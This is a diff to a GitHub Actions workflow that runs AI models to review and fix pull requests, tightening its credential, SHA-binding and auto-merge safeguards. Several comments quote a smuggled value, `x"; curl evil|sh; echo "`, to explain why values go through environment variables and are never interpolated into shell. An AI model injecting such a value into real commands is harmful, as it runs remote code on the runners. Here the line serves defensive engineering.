@@ -21,7 +21,8 @@
 #   escalation chain here (review-fix has no docs lane — asserted structurally in the resolve
 #   step). The reviewer model is read-only (mutation=deny,
 #   no GitHub token in the container) and its verdict is VOID unless the tree is byte-identical.
-# - Arming (gh pr ready + gh pr merge --auto) happens ONLY here, host-side, one-shot, gated on a
+# - Arming (gh pr ready + the sha-bound enablePullRequestAutoMerge latch mutation — never
+#   `gh pr merge`, which direct-merges an already-mergeable PR) happens ONLY here, host-side, gated on a
 #   schema-valid approve verdict + reviewer!=implementer (provider AND account) + the armed head
 #   SHA equalling the reviewed SHA re-read live. Security-labelled surfaces never auto-arm.
 # - rc=3 (none-free) claim handling is copied verbatim from worker.yml: skip-and-retry, never a
@@ -106,6 +107,7 @@ jobs:
       already_done: ${{ steps.pr.outputs.already_done }}
       issue: ${{ steps.pr.outputs.issue }}
       security: ${{ steps.pr.outputs.security }}
+      security_keywords: ${{ steps.pr.outputs.security_keywords }}
       packages: ${{ steps.pr.outputs.packages }}
       package: ${{ steps.pr.outputs.package }}
       routing: ${{ steps.policy.outputs.routing }}
@@ -161,7 +163,7 @@ jobs:
           # the provenance-bound implementer provider in the resolve step below). terra and
           # sonnet are DOCS-ONLY models (maintainer directive 2026-07-18) and this lane is
           # never docs, so a terra/sonnet pin is rejected outright.
-          if model_pin and model_pin not in {"fable", "opus", "sol", "luna"}:
+          if model_pin and model_pin not in {"opus5", "fable", "opus", "sol", "luna"}:
               raise SystemExit("model_pin must be empty or an escalation-ladder tier")
           if mode == "review" and model_pin:
               raise SystemExit("review mode takes no model pin")
@@ -198,12 +200,9 @@ jobs:
           ref: ledger
           persist-credentials: false
 
-      # Trust guard (issue #28 review round 1): the ledger branch is DATA-ONLY by design.
+      # Validate paths, object types, and modes against the canonical data-only allowlist.
       - name: Ledger checkout is data-only (trust guard)
-        run: |
-          set -euo pipefail
-          test ! -e ledger/.github
-          test ! -e ledger/scripts
+        run: python3 registry/scripts/ledger-invariant.py ledger
 
       - name: Checkout public target for protected routing data (pinned, no persisted token)
         uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
@@ -268,6 +267,14 @@ jobs:
           # attention required" marker) are BOTH human-owned terminal for every mode/flavour.
           if {"review:needs-user", "needs:user"} & set(labels):
               raise SystemExit("pull request is human-owned (review:needs-user / needs:user)")
+          # review:parked is the MACHINE-owned capacity park (park_policy.py): a SOFT hold, not
+          # a human terminal — but a parked PR must still never be reviewed/fixed. On a proven
+          # human readmission gesture CLAIM strips this label (converging it to review:needs)
+          # BEFORE dispatching, so a legitimately re-admitted run never carries it here; seeing
+          # it means the park still stands (or landed mid-window) — stand down.
+          if "review:parked" in labels:
+              raise SystemExit("pull request is capacity-parked (review:parked); "
+                               "a human readmission gesture re-admits it via the dispatcher")
           # Only the verdict flavour is bound to review:changes; the ci/rebase repair flavours
           # (GAP-A/B) run over any non-terminal review state — the dispatcher re-derived their
           # triggers (concluded-red gate / conflicting base) from live data at admission.
@@ -344,25 +351,36 @@ jobs:
           # non-security and would auto-arm. Union the builtin set with the TARGET routing's own
           # `[[route]].match_labels` keywords (read from the protected routing at its policy
           # pointer), so a trust-surface issue on ANY target is flagged before the arm gate ever
-          # sees it. A missing/unreadable routing degrades to the builtin set (fail closed:
-          # trust:* still flags, and the path-based arm gate is an independent backstop).
-          import tomllib
-          from pathlib import Path as _Path, PurePosixPath as _PPP
-          keywords = {"zk", "mpc", "crypto", "auth", "e2ee"}
+          # sees it. [#325 round 2] An unreadable policy row or a missing/malformed routing is
+          # FATAL here, never a degrade-to-builtin: this same set drives the arm-time LIVE label
+          # audit (worker-pr.live_security_flagged), so a silently reduced set would let a
+          # routing-keyword label added mid-review classify as benign and auto-arm without the
+          # trust-surface audit — the path classifier is no backstop for a label-only posture.
+          # routing_security_keywords RAISES PolicyError on ANY load or validation failure
+          # (self-tested in policy-resolve.py), the resolve job dies, and the downstream arm
+          # step is never reached.
+          spec_policy = importlib.util.spec_from_file_location(
+              "registry_policy_resolve", Path("registry", "scripts", "policy-resolve.py"))
+          policy_resolve = importlib.util.module_from_spec(spec_policy)
+          spec_policy.loader.exec_module(policy_resolve)
           try:
-              _pol = tomllib.loads(
-                  _Path("registry/policy/repos.toml").read_text(encoding="utf-8"))
-              _routing_ptr = _pol["repos"][repo]["routing"]
-              _routing_path = _Path("target-routing").joinpath(*_PPP(_routing_ptr).parts)
-              _routing = tomllib.loads(_routing_path.read_text(encoding="utf-8"))
-              for _r in _routing.get("route", []):
-                  for _kw in (_r.get("match_labels") or []):
-                      if isinstance(_kw, str) and _kw:
-                          keywords.add(_kw)
-          except (OSError, KeyError, tomllib.TOMLDecodeError):
-              pass  # builtin keywords + trust:* prefix + the path-based arm gate still apply
+              routing_keywords = policy_resolve.routing_security_keywords(
+                  repo, policy_file="registry/policy/repos.toml", target_root="target-routing")
+          except policy_resolve.PolicyError as exc:
+              raise SystemExit(
+                  f"target routing security keywords unresolvable (fail closed): {exc}")
+          keywords = {"zk", "mpc", "crypto", "auth", "e2ee"} | set(routing_keywords)
           security = (any(k in label for label in merged for k in keywords)
                       or any(label.startswith("trust:") for label in merged))
+          # Issue #153: the SAME keyword set the arm step re-applies to LIVE labels. resolve
+          # classifies `security` ONCE, before a review that may take 25min+ (or queue longer);
+          # a trust:* / routing-keyword label added to the PR or its source issue mid-review is
+          # invisible to the arm's path-only recheck unless the arm re-runs this classifier on
+          # live labels. Ride the union set to the arm as a single-line base64 JSON list (a
+          # keyword may hold any char; base64 keeps the output single-line + injection-safe).
+          import base64 as _b64
+          security_keywords_b64 = _b64.b64encode(
+              json.dumps(sorted(keywords)).encode("utf-8")).decode("ascii")
           packages = sorted(label[5:] for label in issue_labels if label.startswith("area:"))
           if any(not re.fullmatch(r"[A-Za-z0-9][A-Za-z0-9_.-]*", p) for p in packages):
               raise SystemExit("source issue has an unsafe area:* label")
@@ -377,6 +395,7 @@ jobs:
               "already_done": "true" if already_done else "false",
               "issue": str(issue),
               "security": "true" if security else "false",
+              "security_keywords": security_keywords_b64,
               "packages": ",".join(packages),
               "package": packages[0] if packages else "__global__",
           }
@@ -435,10 +454,15 @@ jobs:
           # the proven codex drain passes no --model flag (CLI default), and worker-live.sh omits
           # --model in that case — so an unpinned sol/luna never stalls the common
           # anthropic-implemented direction. A claude alias still needs a concrete id.
-          review_chain = {"anthropic": ["sol", "luna"], "openai": ["opus", "fable"]}
-          fix_chain = {"anthropic": ["fable", "opus"], "openai": ["sol", "luna"]}
+          # Opus 5 (maintainer directive 2026-07-24): opus5 takes the primary slot on
+          # every chain where fable/opus led; the old tiers stay as TAIL FALLBACKS only, a
+          # degradation path so an opus5 capacity outage parks work gracefully instead of
+          # stalling the chain. Mirrors dispatch-claim.py REVIEW_CHAIN/FIX_CHAIN.
+          review_chain = {"anthropic": ["sol", "luna"], "openai": ["opus5", "opus", "fable"]}
+          fix_chain = {"anthropic": ["opus5", "fable", "opus"], "openai": ["sol", "luna"]}
           # Escalation ladders in escalation order — weakest tier FIRST, STRONGEST (terminal)
-          # tier LAST per the maintainer capability order opus < luna < fable < sol — mirrors
+          # tier LAST per the maintainer capability order opus < luna < fable < opus5 < sol
+          # (2026-07-24: opus5 is the top ANTHROPIC tier; cross-provider order unchanged) — mirrors
           # worker-pr.py ESCALATION_LADDERS (directives 2026-07-17/18; sol r2 f2 fixed the
           # previously INVERTED order under which exhaustion pinned the weaker tier). A pinned
           # fix-model FLOOR replaces the default fix chain with the ladder tiers at/above the
@@ -447,7 +471,7 @@ jobs:
           # later tick instead of burning the extended round budget on the model that already
           # failed; see dispatch-claim.py). A pin outside the implementer provider's ladder
           # fails closed.
-          ladders = {"anthropic": ["opus", "fable"], "openai": ["luna", "sol"]}
+          ladders = {"anthropic": ["opus", "fable", "opus5"], "openai": ["luna", "sol"]}
           # STRUCTURAL ENFORCEMENT (maintainer directive 2026-07-18): terra + sonnet are
           # DOCS-ONLY — review-fix has no docs lane, so their appearance in ANY chain here is a
           # policy defect. Fail closed before any claim can run on the wrong model.
@@ -512,6 +536,10 @@ jobs:
     if: ${{ needs.resolve.outputs.unresolvable != 'true' }}
     runs-on: ubuntu-latest
     timeout-minutes: 10
+    # SECRET-EXFIL GUARD (issue #101): reads PROVENANCE_SALT, which lives in the
+    # `dispatch-secrets` environment (deployment-branch policy: default branch only) — full
+    # rationale on the `claim` job in dispatch.yml.
+    environment: dispatch-secrets
     permissions:
       contents: write
       issues: read
@@ -572,10 +600,14 @@ jobs:
           # impl `<repo>#`, so neither cap counts the other. The shared per-mode prefix bounds
           # concurrent reviews to the static codex slot count (codex is usage-exempt; the CLI
           # claim path does not usage-gate, so this static cap IS the bound — by design).
+          # TTL must outlive this workflow's remaining wall-clock (claim -> run -> release) plus
+          # queue slack, or the allocator reclaims this still-live account and two sessions race
+          # on one credential (issue #159). Kept in sync with dispatch-claim.py REVIEW_TTL/FIX_TTL
+          # (which use the DISPATCHER-claim path's longer bound; adopting that bound here is safe).
           if [[ "$MODE" == review ]]; then
-            prefix="review:"; cap=10; ttl=1200; role=review
+            prefix="review:"; cap=10; ttl=4200; role=review
           else
-            prefix="fix:"; cap=3; ttl=3600; role=fix
+            prefix="fix:"; cap=3; ttl=6300; role=fix
           fi
           holder="$prefix$TARGET_REPO#$PR_NUMBER@$GITHUB_RUN_ID.$GITHUB_RUN_ATTEMPT"
           set +e
@@ -758,6 +790,11 @@ jobs:
     if: ${{ needs.claim.outputs.acquired == 'true' }}
     runs-on: ubuntu-latest
     timeout-minutes: ${{ inputs.mode == 'review' && 25 || 60 }}
+    # SECRET-EXFIL GUARD (issue #101): reads REGISTRY_ADMIN_APP_ID/KEY + the per-account
+    # secrets[secret_ref] credential, which live in the `dispatch-secrets` environment
+    # (deployment-branch policy: default branch only) — full rationale on the `claim` job in
+    # dispatch.yml.
+    environment: dispatch-secrets
     permissions:
       # READ ONLY — in fix mode this job executes model-authored target code HOST-side (the
       # cargo gate), so no registry-WRITE token may exist anywhere in its blast radius. The
@@ -770,15 +807,33 @@ jobs:
       verdict_b64: ${{ steps.handoff.outputs.verdict_b64 }}
       files_b64: ${{ steps.handoff.outputs.files_b64 }}
       fix_done: ${{ steps.fix.outcome }}
+      # Issue #560: whether the recorded verdict was STAGED for the fixer, and the reason it was
+      # not. staged=false means this run produced NOTHING — no fix, no push, no verdict — because
+      # no recorded verdict is bound to the live head. The `outcome` job must then hand the PR from
+      # the FIX lane to the REVIEW lane, or fix-enumeration (which keys on review:changes) re-claims
+      # it on every ~8min dispatch tick while review-enumeration (review:needs) never sees it.
+      # Empty in review mode and for the ci/rebase repair flavours (stage-verdict is skipped there).
+      verdict_staged: ${{ steps.stage-verdict.outputs.staged }}
+      verdict_stale_reason: ${{ steps.stage-verdict.outputs.stale_reason }}
       fix_made_changes: ${{ steps.fix.outputs.fix_made_changes }}
       injection_detected: ${{ steps.fix.outputs.injection_detected }}
       gate_outcome: ${{ steps.gate.outcome }}
       pushed: ${{ steps.push.outcome == 'success' && 'true' || 'false' }}
+      # Issue #156: the exact commit the fix pushed. The fix-outcome revalidates the live head
+      # against the head THIS run produced (this sha on a push, else the unchanged reviewed head)
+      # so a stale re-review/needs-user never acts on a head another push produced.
+      pushed_sha: ${{ steps.push.outputs.pushed_sha }}
       # Model-access health (registry #32): the sanitized exit CLASS of the review/fix model launch,
       # recorded by the separate no-target-code `model_health` job (success or failure), plus the
       # sanitized session-limit reset time (review defect #9; empty for every other class).
       exit_class: ${{ steps.exit-class.outputs.class }}
       reset_hint: ${{ steps.exit-class.outputs.reset_hint }}
+      # THIS job's run attempt, stamped beside the class (review round 1 of #425): the recorder's
+      # idempotency key must track the attempt that PRODUCED the outcome, not the recorder's own.
+      # A recorder-only retry replays this preserved output (same attempt -> dedup no-op); a full
+      # re-run re-executes this job and stamps a fresh attempt, so its genuinely new outcome
+      # still counts toward backoff/outage thresholds.
+      outcome_attempt: ${{ steps.exit-class.outputs.outcome_attempt }}
     steps:
       - name: Checkout private registry (pinned, no persisted token)
         uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
@@ -796,12 +851,9 @@ jobs:
           ref: ledger
           persist-credentials: false
 
-      # Trust guard (issue #28 review round 1): the ledger branch is DATA-ONLY by design.
+      # Validate paths, object types, and modes against the canonical data-only allowlist.
       - name: Ledger checkout is data-only (trust guard)
-        run: |
-          set -euo pipefail
-          test ! -e ledger/.github
-          test ! -e ledger/scripts
+        run: python3 registry/scripts/ledger-invariant.py ledger
 
       # Per-phase least-privilege App tokens. The REVIEW token cannot write target contents (the
       # reviewer never pushes); the FIX token can (it pushes the fix commit). The ARM path mints
@@ -977,6 +1029,10 @@ jobs:
       # call still consumes budget: a deterministic crash re-claims at most max_review_rounds
       # times and then escalates to needs-user via the sweep — never an unbounded
       # re-claim/re-crash loop. Idempotent per run key (a re-run of this run records nothing new).
+      # Issue #162: the marker binds the head sha it reviews (--head-sha) so a review that DEFERS
+      # as stale (the live head moved off this commit) is voided by the outcome step and not
+      # charged — legitimate head churn no longer burns the global round budget. A crash (no
+      # outcome step) records no void and stays charged, so the crash bound is unchanged.
       - name: Record the review round before the model runs (bounded-crash accounting)
         id: round
         if: ${{ inputs.mode == 'review' && steps.prepare.outcome == 'success' }}
@@ -988,6 +1044,7 @@ jobs:
             --pr "${{ inputs.pr_number }}" \
             --round "${{ inputs.review_round }}" \
             --run-key "$GITHUB_RUN_ID.$GITHUB_RUN_ATTEMPT" \
+            --head-sha "${{ needs.resolve.outputs.head_sha }}" \
             --bot-login "${{ steps.target.outputs.bot_login }}"
 
       # Prior-round context for the progress grade (maintainer directive 2026-07-17): the
@@ -1074,6 +1131,11 @@ jobs:
           TARGET_REPO: ${{ inputs.target_repo }}
           REVIEW_ROUND: ${{ inputs.review_round }}
           WORKER_ROOT: ${{ runner.temp }}/registry-worker
+          # Issue #156: the head the fixer is about to check out and edit. stage-verdict only
+          # unwraps the recorded verdict when its host envelope binds it to THIS sha; a stale or
+          # legacy-unbound record sets staged=false and the fix step below skips (the sweep
+          # re-reviews the advanced head) — the fixer is never seeded against unreviewed code.
+          EXPECTED_SHA: ${{ needs.resolve.outputs.head_sha }}
         run: |
           set -euo pipefail
           owner="${TARGET_REPO%%/*}"
@@ -1082,13 +1144,23 @@ jobs:
           record="ledger/orchestration/review-verdicts/${owner}--${name}--pr${{ inputs.pr_number }}-round${REVIEW_ROUND}.json"
           [[ -f "$record" ]] || record="registry/orchestration/review-verdicts/${owner}--${name}--pr${{ inputs.pr_number }}-round${REVIEW_ROUND}.json"
           [[ -f "$record" ]] || { echo "::error::no registry verdict record for round $REVIEW_ROUND"; exit 1; }
-          install -m 600 "$record" "$WORKER_ROOT/review-verdict.json"
+          # The sha alone is not identity — the record's envelope must ALSO name exactly this
+          # dispatch's repo/PR/round (a same-commit record for another PR or round sets
+          # staged=false and the fix step below skips).
+          python3 registry/scripts/worker-pr.py stage-verdict \
+            --record-file "$record" \
+            --out-file "$WORKER_ROOT/review-verdict.json" \
+            --expected-sha "$EXPECTED_SHA" \
+            --target-repo "$TARGET_REPO" \
+            --pr "${{ inputs.pr_number }}" \
+            --round "$REVIEW_ROUND"
 
       - name: Run same-provider fix (findings framed as untrusted data)
         id: fix
-        # kind=verdict requires the staged verdict; the ci/rebase flavours run whenever prepare
-        # succeeded (stage-verdict is skipped for them, and a FAILED stage still blocks verdict).
-        if: ${{ inputs.mode == 'fix' && steps.prepare.outcome == 'success' && (steps.stage-verdict.outcome == 'success' || steps.stage-verdict.outcome == 'skipped') }}
+        # kind=verdict requires the verdict STAGED against the live head (issue #156:
+        # staged=false means the record was stale/unbound — skip so the sweep re-reviews); the
+        # ci/rebase flavours run whenever prepare succeeded (stage-verdict is skipped for them).
+        if: ${{ inputs.mode == 'fix' && steps.prepare.outcome == 'success' && (steps.stage-verdict.outcome == 'skipped' || steps.stage-verdict.outputs.staged == 'true') }}
         working-directory: target
         env:
           TARGET_DIR: ${{ github.workspace }}/target
@@ -1108,13 +1180,23 @@ jobs:
           WORKER_AGENT: ${{ needs.resolve.outputs.agent }}
         run: bash ../registry/scripts/worker-live.sh fix
 
-      # The provider CLI may refresh the account credential during the run (codex rotates its
-      # auth.json); write it back exactly like worker.yml so the next claim still authenticates.
-      # Runs IMMEDIATELY after the model steps and BEFORE the gate: rotation only happens during
-      # the model call, and REGISTRY_SECRETS_PAT must never be live in a step that runs after
-      # hostile target code executed on this runner (the fix-mode cargo gate below).
+      # Persist a HOST-SIDE-rotated account credential so the next claim still authenticates
+      # (issue #596). Rotation happens in worker-prep's pre-flight refresh, NOT in the container:
+      # the credential file is bind-mounted read-only (issue #134), so the CLI's own in-place
+      # refresh cannot happen there — which is exactly why this lane died. Still runs BEFORE the
+      # gate: REGISTRY_SECRETS_PAT must never be live in a step that runs after hostile target code
+      # executed on this runner (the fix-mode cargo gate below).
       - name: Write back a rotated full account credential
-        if: ${{ always() && steps.prepare.outcome == 'success' && (steps.review.outcome != 'skipped' || steps.fix.outcome != 'skipped') }}
+        # NO model-step guard (issue #596): see worker.yml — a host-side rotation must be
+        # persisted even when the model step never ran, or the consumed grant strands the account.
+        #
+        # NO PREPARE-STEP GUARD EITHER (retro-review of #614): see the long note on the same step in
+        # worker.yml. `steps.prepare.outcome == 'success'` made the write-back reachable only from
+        # the success path of the very step that CONSUMES the one-time-use grant, so a failure after
+        # the provider committed the rotation killed the account permanently. Keyed instead to the
+        # account SELECTION; worker-live.sh's rotation marker decides whether anything needs
+        # persisting, and with no marker this is a rotated=false no-op.
+        if: ${{ always() && steps.selected.outcome == 'success' }}
         env:
           WORKER_ROOT: ${{ runner.temp }}/registry-worker
           WORKER_ACCOUNT: ${{ steps.selected.outputs.account }}
@@ -1141,12 +1223,52 @@ jobs:
           if [[ "$REVIEW_OUTCOME" == "success" || "$FIX_OUTCOME" == "success" ]]; then
             cls=success
           elif [[ "$REVIEW_OUTCOME" == "skipped" && "$FIX_OUTCOME" == "skipped" ]]; then
-            cls=unknown   # pre-launch abort/cancellation: no host-observed CLI exit exists
+            # Pre-launch abort/cancellation: no host-observed CLI exit exists. But worker-prep's
+            # host-side credential pre-flight (issue #596) DOES classify its own failures and writes
+            # WORKER_EXIT_CLASS before any model step can run — recording `unknown` over it would
+            # discard the one signal that says "this account needs a re-mint".
+            cls="${WORKER_EXIT_CLASS:-unknown}"
           else
             cls="${WORKER_EXIT_CLASS:-unknown}"
           fi
-          echo "class=$cls" >> "$GITHUB_OUTPUT"
-          echo "reset_hint=${WORKER_RESET_HINT:-}" >> "$GITHUB_OUTPUT"
+          # outcome_attempt: the attempt that produced this outcome — the recorder's dedup key
+          # (review r1 of #425). Grouped redirect (SC2129): one append, three keys.
+          {
+            echo "class=$cls"
+            echo "reset_hint=${WORKER_RESET_HINT:-}"
+            echo "outcome_attempt=${GITHUB_RUN_ATTEMPT:-}"
+          } >> "$GITHUB_OUTPUT"
+
+      # [registry #596] A CREDENTIAL-OUTAGE launch failure must NOT consume a review round.
+      # The round marker is written BEFORE the model runs, and the `outcome` job that would void it
+      # is gated (job-level `if`) on a validated verdict / successful fix — so when the model launch
+      # itself dies on the account credential (acct01's codex OAuth access token expires hourly while
+      # the fleet stores a static snapshot of it; observed `model-exit-class=auth` on review-fix runs,
+      # 5 auth vs 5 success in one window, then 2 more) the outcome job is SKIPPED and the round
+      # stayed charged forever. Enough of those and a pure credential outage walked the PR through the
+      # bounded round budget into a capacity park as if the reviewer had declined.
+      #
+      # It runs HERE, in the same job that charged the round, because this is the only place that both
+      # sees the exit class and still runs when no verdict exists. The class gate lives in
+      # worker-pr.is_credential_outage (pure + self-tested), NOT in this `if:` — a non-outage class is
+      # a deliberate no-op, so `setup`/`unknown`/timeouts stay charged and the bounded-crash
+      # accounting is unchanged. The review-scoped App token already present in this job (issues +
+      # pull-requests write, NO target contents write) is exactly what round-record used, so no new
+      # capability is introduced, and in review mode this job executes no target code.
+      - name: Void the review round on a credential-outage exit (never a decline)
+        id: round-void
+        if: ${{ always() && inputs.mode == 'review' && steps.round.outcome == 'success' }}
+        env:
+          GH_TOKEN: ${{ steps.app-token-review.outputs.token }}
+          EXIT_CLASS: ${{ steps.exit-class.outputs.class }}
+        run: |
+          python3 registry/scripts/worker-pr.py round-void \
+            --repo "${{ inputs.target_repo }}" \
+            --pr "${{ inputs.pr_number }}" \
+            --round "${{ inputs.review_round }}" \
+            --run-key "$GITHUB_RUN_ID.$GITHUB_RUN_ATTEMPT" \
+            --bot-login "${{ steps.target.outputs.bot_login }}" \
+            --exit-class "$EXIT_CLASS"
 
       - name: Ensure a Rust toolchain for the crate-scoped gate
         if: ${{ inputs.mode == 'fix' && steps.fix.outputs.fix_made_changes == 'true' && steps.fix.outputs.injection_detected != 'true' }}
@@ -1219,13 +1341,21 @@ jobs:
   # 2) findings + outcome labels (or arm), 3) the reviewed-sha bind LAST. A crash between any
   # two leaves reviewed-sha != head, so the sweep re-derives the PR next tick (bounded by the
   # pre-model round marker + max_review_rounds) instead of a silent permanent stall; the arm
-  # path additionally restores the draft state if `merge --auto` fails after `pr ready`.
+  # path additionally restores the draft state if the latch mutation fails after `pr ready`.
   outcome:
     name: Apply ${{ inputs.mode }} outcome (no target code runs here)
     needs: [resolve, claim, run]
-    if: ${{ always() && needs.claim.outputs.acquired == 'true' && (needs.run.outputs.verdict_ok == 'success' || needs.run.outputs.fix_done == 'success') }}
+    # Issue #560 adds the third admission: a fix run that STAGED NOTHING (verdict_stale_reason
+    # non-empty) skips the fix step, so fix_done is 'skipped' and this job used to be skipped with
+    # it — which is exactly why the PR kept review:changes and the fix lane re-admitted it forever.
+    # The lane hand-over below is the only step that runs on that path.
+    if: ${{ always() && needs.claim.outputs.acquired == 'true' && (needs.run.outputs.verdict_ok == 'success' || needs.run.outputs.fix_done == 'success' || needs.run.outputs.verdict_stale_reason != '') }}
     runs-on: ubuntu-latest
     timeout-minutes: 15
+    # SECRET-EXFIL GUARD (issue #101): reads REGISTRY_ADMIN_APP_ID/KEY + PROVENANCE_SALT, which
+    # live in the `dispatch-secrets` environment (deployment-branch policy: default branch only)
+    # — full rationale on the `claim` job in dispatch.yml.
+    environment: dispatch-secrets
     permissions:
       contents: write   # write: record the validated verdict in the registry (github.token)
       issues: write     # write: ops-alert upsert in the registry on needs-user escalation
@@ -1263,6 +1393,7 @@ jobs:
             --target-repo "${{ inputs.target_repo }}" \
             --pr "${{ inputs.pr_number }}" \
             --round "${{ inputs.review_round }}" \
+            --reviewed-sha "${{ needs.run.outputs.reviewed_sha }}" \
             --verdict-file "$RUNNER_TEMP/review-verdict.json"
 
       - name: Mint outcome-scoped App token (PR labels/comments only, no target contents)
@@ -1292,6 +1423,9 @@ jobs:
           # [OPUS-4.8] B3: the target policy row's security_paths (base64 JSON list). Each path
           # becomes a --surface-path so a trust-surface diff routes its arm to a human.
           SECURITY_PATHS_B64: ${{ needs.resolve.outputs.security_paths }}
+          # Catalog-controlled provider reaches this job via env ONLY — never interpolated into the
+          # run: shell source, where `x"; curl evil|sh; echo "` would execute (issue #199).
+          IMPL_PROVIDER: ${{ needs.resolve.outputs.impl_provider }}
         run: |
           set -euo pipefail
           args=(
@@ -1303,9 +1437,10 @@ jobs:
             --round "${{ inputs.review_round }}"
             --max-rounds "${{ needs.resolve.outputs.max_review_rounds }}"
             --issue "${{ needs.resolve.outputs.issue }}"
-            --impl-provider "${{ needs.resolve.outputs.impl_provider }}"
+            --impl-provider "$IMPL_PROVIDER"
             --bot-login "${{ needs.resolve.outputs.pr_author }}"
             --run-key "$GITHUB_RUN_ID.$GITHUB_RUN_ATTEMPT"
+            --reviewed-sha "${{ needs.run.outputs.reviewed_sha }}"
           )
           [[ "$SECURITY" == "true" ]] && args+=(--security)
           while IFS= read -r p; do
@@ -1346,6 +1481,15 @@ jobs:
           # [OPUS-4.8] B3, revised per Decision 7 (2026-07-18): the LIVE trust-surface
           # derivation now feeds the SHA-bound pre-arm AUDIT trail instead of a human park.
           SECURITY_PATHS_B64: ${{ needs.resolve.outputs.security_paths }}
+          # Issue #153: the routing's own security match_labels keywords (union with the builtin
+          # set, resolved once above). The arm re-reads LIVE PR + source-issue labels against
+          # these so a security label added DURING the review still lands in the audit trail.
+          SECURITY_KEYWORDS_B64: ${{ needs.resolve.outputs.security_keywords }}
+          # Catalog-controlled providers reach this contents:write + PROVENANCE_SALT arm job via env
+          # ONLY — never interpolated into the run: shell source, where `x"; curl evil|sh; echo "`
+          # would execute (issue #199). worker-pr.py ready-and-arm asserts reviewer != implementer.
+          IMPL_PROVIDER: ${{ needs.resolve.outputs.impl_provider }}
+          REVIEWER_PROVIDER: ${{ needs.claim.outputs.provider }}
         run: |
           set -euo pipefail
           args=(
@@ -1353,9 +1497,9 @@ jobs:
             --repo "${{ inputs.target_repo }}"
             --pr "${{ inputs.pr_number }}"
             --reviewed-sha "${{ needs.run.outputs.reviewed_sha }}"
-            --impl-provider "${{ needs.resolve.outputs.impl_provider }}"
+            --impl-provider "$IMPL_PROVIDER"
             --impl-account-h "${{ needs.resolve.outputs.impl_account_h }}"
-            --reviewer-provider "${{ needs.claim.outputs.provider }}"
+            --reviewer-provider "$REVIEWER_PROVIDER"
             --arm "${{ needs.resolve.outputs.arm_auto_merge }}"
             --issue "${{ needs.resolve.outputs.issue }}"
             --bot-login "${{ needs.resolve.outputs.pr_author }}"
@@ -1364,6 +1508,10 @@ jobs:
           while IFS= read -r p; do
             [[ -n "$p" ]] && args+=(--surface-path "$p")
           done < <(printf '%s' "${SECURITY_PATHS_B64:-W10=}" | base64 -d \
+            | python3 -c 'import json,sys; [print(x) for x in json.load(sys.stdin)]')
+          while IFS= read -r k; do
+            [[ -n "$k" ]] && args+=(--security-keyword "$k")
+          done < <(printf '%s' "${SECURITY_KEYWORDS_B64:-W10=}" | base64 -d \
             | python3 -c 'import json,sys; [print(x) for x in json.load(sys.stdin)]')
           python3 registry/scripts/worker-pr.py "${args[@]}"
 
@@ -1377,7 +1525,10 @@ jobs:
         # [round-5 P1] decision == 'hold' is the hold-wins DROP (a human/groom park landed
         # after the review resolved): the outcome applied NOTHING, so reviewed-sha must stay
         # unbound — the sweep re-derives this head once a human clears the park.
-        if: ${{ inputs.mode == 'review' && steps.outcome.outcome == 'success' && steps.outcome.outputs.decision != 'hold' && (steps.outcome.outputs.decision != 'arm' || (steps.arm.outcome == 'success' && steps.arm.outputs.arm_complete == 'true')) }}
+        # [issue #156] decision == 'stale' is the head-moved DROP (the live head advanced off
+        # the reviewed sha during the run): the outcome applied NOTHING, so reviewed-sha must
+        # stay unbound — the sweep re-reviews the current head.
+        if: ${{ inputs.mode == 'review' && steps.outcome.outcome == 'success' && steps.outcome.outputs.decision != 'hold' && steps.outcome.outputs.decision != 'stale' && (steps.outcome.outputs.decision != 'arm' || (steps.arm.outcome == 'success' && steps.arm.outputs.arm_complete == 'true')) }}
         env:
           GH_TOKEN: ${{ steps.app-token-outcome.outputs.token }}
         run: |
@@ -1395,6 +1546,10 @@ jobs:
           ALERT_REPO: ${{ secrets.ALERT_REPO || vars.ALERT_REPO || '' }}
           ALERT_TOKEN: ${{ secrets.ALERT_TOKEN || '' }}
           MAINTAINER_HANDLE: jeswr
+          # Catalog-controlled model alias reaches this write-scoped App-token job via env ONLY —
+          # never interpolated into the run: shell source, where `x"; curl evil|sh; echo "` would
+          # execute (issue #199, same class as the provider paths).
+          MODEL_ALIAS: ${{ needs.claim.outputs.model }}
         run: |
           python3 registry/scripts/worker-pr.py fix-outcome \
             --repo "${{ inputs.target_repo }}" \
@@ -1402,12 +1557,61 @@ jobs:
             --round "${{ inputs.review_round }}" \
             --run-key "$GITHUB_RUN_ID.$GITHUB_RUN_ATTEMPT" \
             --bot-login "${{ needs.resolve.outputs.pr_author }}" \
-            --model "${{ needs.claim.outputs.model }}" \
+            --model "$MODEL_ALIAS" \
             --injection "${{ needs.run.outputs.injection_detected == 'true' && 'true' || 'false' }}" \
             --made-changes "${{ needs.run.outputs.fix_made_changes == 'true' && 'true' || 'false' }}" \
             --gate-outcome "${{ needs.run.outputs.gate_outcome }}" \
             --pushed "${{ needs.run.outputs.pushed }}" \
+            --reviewed-sha "${{ needs.run.outputs.pushed == 'true' && needs.run.outputs.pushed_sha || needs.resolve.outputs.head_sha }}" \
             --issue "${{ needs.resolve.outputs.issue }}"
+
+      # Issue #560 — WRONG-LANE SPIN CLOSURE. stage-verdict refused to seed the fixer because no
+      # recorded verdict is bound to the live head (a legacy pre-#156 unbound record, a head that
+      # moved under an update-branch/main merge, or an envelope naming another repo/PR/round), so
+      # this run produced NOTHING. Leaving review:changes on the PR kept it in the FIX lane's bucket
+      # while only the REVIEW lane can mint the head-bound verdict the fixer needs: live 2026-07-24,
+      # sparq#3523/#3542/#3572/#3573/#3608 each launched a fix run per ~8min tick from 08:02Z, every
+      # one completing "success" on `deferring to a fresh review` (~35 wasted runs/hour, each burning
+      # an account claim + a runner) until a human flipped the five labels. Hand the PR over here.
+      #
+      # This is a MACHINE LANE transition, NOT a park: worker-pr.py reads the live hold surface first
+      # (BOTH machine park labels — review:parked on the PR and status:parked on the source issue —
+      # plus the human holds), RE-READS it immediately before writing, and ABORTS the whole hand-over
+      # if any of them landed in between: the park WINS (issue #555) and is never converted into a
+      # human-owned review:needs-user. Every abort is decided BEFORE the first write, so it leaves no
+      # trace at all (#584 follow-up finding 2). It is idempotent, so a re-run or a concurrent claim
+      # that already handed over writes nothing. The fix CLAIM itself (the `fix:<repo>#<pr>` lease
+      # enumerate_review_items single-flights on) is released unconditionally by the `release` job
+      # below, which does not depend on this job — the slot is free before the next tick.
+      #
+      # A live `review:pass` STANDS THE HAND-OVER DOWN entirely (#584 follow-up finding 1) — no lane
